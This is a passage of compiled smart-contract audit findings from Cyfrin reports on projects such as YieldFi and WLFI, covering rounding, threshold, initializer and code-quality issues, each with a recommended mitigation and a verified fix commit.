### Detailed Content (from source)
**Description:** Use [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) to safely downcast amounts. or add a comment indicate that this downcast is safe:
```solidity
wlfi/WorldLibertyFinancialRegistry.sol
64:                amount: uint112(_amounts[i]),
```

**WLFI:**
Fixed in commit [b567696](https://github.com/worldliberty/usd1-protocol/blob/b56769613b6438b62b8b4133a63fca727fdbc631/contracts/wlfi/WorldLibertyFinancialRegistry.sol#L81C49-L81C104)

**Cyfrin:** Verified.

## [M-164] `Ytoken L2::preview Mint` and `YToken L2::preview Withdraw` round in favor of user
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** For the L2 `YToken` contracts, assets are not managed directly. Instead, the vault’s exchange rate is provided by an oracle, using the exchange rate from L1 as the source of truth.

This architectural choice requires custom implementations of functions like `previewMint`, `previewDeposit`, `previewRedeem`, and `previewWithdraw`, as well as the internal `_convertToShares` and `_convertToAssets`. These have been re-implemented to rely on the oracle-provided exchange rate instead of local accounting.

However, both `previewMint` and `previewWithdraw` currently perform rounding in favor of the user:

- [`YTokenL2::previewMint`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L249-L250):
  ```solidity
  // Calculate assets based on exchange rate
  return (grossShares * exchangeRate()) / Constants.PINT;
  ```
- [`YTokenL2::previewWithdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L261-L262):
  ```solidity
  // Calculate shares needed for requested assets based on exchange rate
  uint256 sharesWithoutFee = (assets * Constants.PINT) / exchangeRate();
  ```

This behavior contradicts the [security recommendations in EIP-4626](https://eips.ethereum.org/EIPS/eip-4626#security-considerations), which advise rounding in favor of the vault to prevent value leakage.

**Impact:** By rounding in favor of the user, these functions allow users to receive slightly more shares or assets than they should. While the two-step withdrawal process limits the potential for immediate exploitation, this rounding error can result in a slow and continuous value leak from the vault—especially over many transactions or in the presence of automation.

**Recommended Mitigation:** Update `previewMint` and `previewWithdraw` to round in favor of the vault. This can be done by adopting the modified `_convertToShares` and `_convertToAssets` functions with explicit rounding direction, similar to the approach used in the [OpenZeppelin ERC-4626 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/extensions/ERC4626Upgradeable.sol#L177-L185).

**YieldFi:** Fixed in commit [`a820743`](https://github.com/YieldFiLabs/contracts/commit/a82074332cc1f57eba398100c3a43e8a70a4c8ce)

**Cyfrin:** Verified. the preview functions now utilizes `_convertToShares` and `_convertToAssets` with the correct rounding direction.

## [M-165] Balance check for yield claims in `Perpetual Bond::_validate` can be easily bypassed
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** In [`PerpetualBond::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L312-L314), there's a check to ensure that users have a non-zero balance before claiming yield:

```solidity
// Yield claim
require(balanceOf(_caller) > 0, "!bond balance"); // Caller must hold bonds to claim yield
require(accruedRewardAtCheckpoint[_caller] > 0, "!claimable yield"); // Must have claimable yield
```

However, this check can be bypassed by holding a trivial amount, such as 1 wei, of `PerpetualBond` tokens. A more meaningful check would ensure that the user's balance exceeds the `minimumTxnThreshold`, similar to how other parts of the contract enforce value-based thresholds.

Consider updating the balance check to compare against `minimumTxnThreshold` using the bond-converted value:

```diff
- require(balanceOf(_caller) > 0, "!bond balance");
+ require(_convertToBond(balanceOf(_caller)) > minimumTxnThreshold, "!bond balance");
```

Additionally, the second check on `accruedRewardAtCheckpoint[_caller]` is redundant, since [`PerpetualBond::requestYieldClaim`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L374-L378) already performs a value-based threshold check:

```solidity
// Convert yield amount to bond tokens for threshold comparison
uint256 yieldInBondTokens = _convertToBond(claimableYieldAmount);

// Check if the yield claim is worth executing
require(yieldInBondTokens >= minimumTxnThreshold, "!min txn threshold");
```

This makes the `accruedRewardAtCheckpoint` check in `_validate` unnecessary.

**YieldFi:** Fixed in commit [`f0bf88c`](https://github.com/YieldFiLabs/contracts/commit/f0bf88cb51a92a119cdde896c4b0118be1d1a031)

**Cyfrin:** Verified. Balance check removed as the user might still have yield even if they have no tokens (sold/transferred). Yield check in `_validate` is also removed as it's redundant.

\clearpage

## [M-166] Direct YToken deposits can lock funds below minimum withdrawal threshold
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** In [`Manager::deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L134-L155), there is a check enforcing a minimum deposit amount inside [`Manager::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L125-L126):

```solidity
uint256 normalizedAmount = _normalizeAmount(_yToken, _asset, _amount);
require(IERC4626(_yToken).convertToShares(normalizedAmount) >= minSharesInYToken[_yToken], "!minShares");
```

A similar check exists in the [redeem flow](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L157-L197), again via [`Manager::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L130):

```solidity
require(_amount >= minSharesInYToken[_yToken], "!minShares");
```

However, no such minimum is enforced when depositing directly into a `YToken`. In both [`YToken::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L140) and [`YTokenL2::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L150), the only requirement is:

```solidity
require(receiver != address(0) && assets > 0 && shares > 0, "!valid");
```

As a result, a user could deposit an amount that results in fewer shares than `minSharesInYToken[_yToken]`, which cannot be withdrawn through the `Manager` due to its minimum withdrawal check, effectively locking their funds.

**Impact:** Users can bypass the minimum share threshold by depositing directly into a `YToken`. If the resulting share amount is below the minimum allowed for withdrawal via the `Manager`, the user will be unable to exit their position. This can lead to unintentionally locked funds and a poor user experience.

**Recommended Mitigation:** Consider enforcing the `minSharesInYToken[_yToken]` threshold in `YToken::_deposit` and `YTokenL2::_deposit` to prevent deposits that are too small to be withdrawn. Additionally, consider validating post-withdrawal balances to ensure users are not left with non-withdrawable "dust" (i.e., require remaining shares to be either `0` or `> minSharesInYToken[_yToken]`).

**YieldFi:** Fixed in commit [`221c7d0`](https://github.com/YieldFiLabs/contracts/commit/221c7d0644af8fcb4d229d3e95e45323dc6f99a6)

**Cyfrin:** Verified. Minimum shares is now verified in the YToken contracts. Manager also verifies that there is no dust left after redeem.

\clearpage

## [M-167] Lack of `_disable Initializers` in upgradeable contracts
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** YieldFi utilizes upgradeable contracts. It's [best practice](https://docs.openzeppelin.com/upgrades-plugins/writing-upgradeable#initializing_the_implementation_contract) to disable the ability to initialize the implementation contracts.

Consider adding a constructor with the OpenZeppelin `_disableInitializers` in all the upgradeable contracts:
```solidity
constructor() {
    _disableInitializers();
}
```

**YieldFi:** Fixed in commit [`584b268`](https://github.com/YieldFiLabs/contracts/commit/584b268a75a8f7c7f10eda46efaaa3ebbe4f0159)

**Cyfrin:** Verified. Constructor with `_disableInitializers` added to all upgradeable contracts.

## [M-168] Unused errors
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** In the library [`Common`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Common.sol#L5-L6) there are two unused errors:
```solidity
error SignatureVerificationFailed();
error BadSignature();
```
Consider removing these.

**YieldFi:** Fixed in commit [`9aa242b`](https://github.com/YieldFiLabs/contracts/commit/9aa242b7351314fe07160e98699d8da14a1b9bc2)

**Cyfrin:** Verified.

<!-- /Cyfrin Fixed Issues (Merged) -->

## [M-49] In `Remora Token::admin Claim Payout`, `admin Transfer From` don't call `has Signed Docs` when `check TC == false`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** In `RemoraToken::adminClaimPayout` don't call `hasSignedDocs` when `checkTC == false` to prevent doing unnecessary work:
```solidity
function adminClaimPayout(
    address investor,
    bool useStablecoin,
    bool useCustomFee,
    bool checkTC,
    uint256 feeValue
) external nonReentrant restricted {
    if(checkTC) {
        (bool res, ) = hasSignedDocs(investor);
        if (!res) revert TermsAndConditionsNotSigned(investor);
    }

    _claimPayout(investor, useStablecoin, useCustomFee, feeValue);
}
```

Apply similar fix to `adminTransferFrom`.

**Remora:** Fixed in commit [a5c03d4](https://github.com/remora-projects/remora-smart-contracts/commit/a5c03d4d22a783e3ab7966a7e573724648cad0a9).

**Cyfrin:** Verified.

## [M-38] Revert if `Staking Vault::deposit, mint, redeem, withdraw` would return zero
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** A common tactic of vault exploits is that the vault is manipulated such that:
* `deposit` returns 0 shares (user makes a deposit but gets no shares, effectively donating to the vault)
* `mint` returns 0 assets (user gets shares without depositing assets)
* `redeem` returns 0 assets (user burned their shares but got no assets)
* `withdraw` returns 0 shares (user withdrew assets without burning shares)

There is no legitimate user transaction which should succeed under any of the above conditions; to deny attackers these attack paths, revert if `StakingVault::deposit, mint, redeem, withdraw` would return 0.

**Syntetika:**
Fixed in commit [2e72a57](https://github.com/SyntetikaLabs/monorepo/commit/2e72a57bf8463c7a41d5b4e1c030cf1263507d2f).

**Cyfrin:** Verified.
